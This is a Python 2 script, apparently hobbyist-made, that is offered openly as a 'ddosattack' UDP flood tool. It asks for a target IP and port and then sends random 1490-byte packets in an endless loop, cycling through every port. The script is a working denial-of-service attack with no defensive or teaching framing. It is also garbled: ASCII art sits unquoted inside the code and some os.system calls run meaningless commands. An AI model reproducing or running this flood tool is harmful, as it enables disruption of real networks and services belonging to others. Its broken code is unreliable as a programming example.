import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("ddosattack")
print
print "github   : "
print "facebook: احمدالفقير"
                           ______                                  
                        .-.      .-.                               
                       /            \                              
                      |  [ ddosattack-dz ] |                             
                      |,  .-.  .-.  ,|                             
                      | )(|_/  \|_)( |                             
                      |/     /\     \|                             
              _       (_     ^^     _)                             
      _\ ____) \_______\__|IIIIII|__/_______________________________     
     (_)[___]{}<________|-\IIIIII/-|__ddosattack*hmidax01__ddosattack*hmidax01*ddosattack__hmidax01*ddosattack__________\    
       /     )_/        \          /                               
                         \ ______ / 
print
ip = raw_input("IP Target  : ")
port = input("Port       : ")

os.system("clear")
os.system("Attack Starting")
print "[  starting attack  ] 0% "
time.sleep(5)
print "[ Setting up Attack ] "
time.sleep(5)
print "[Almost Done] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

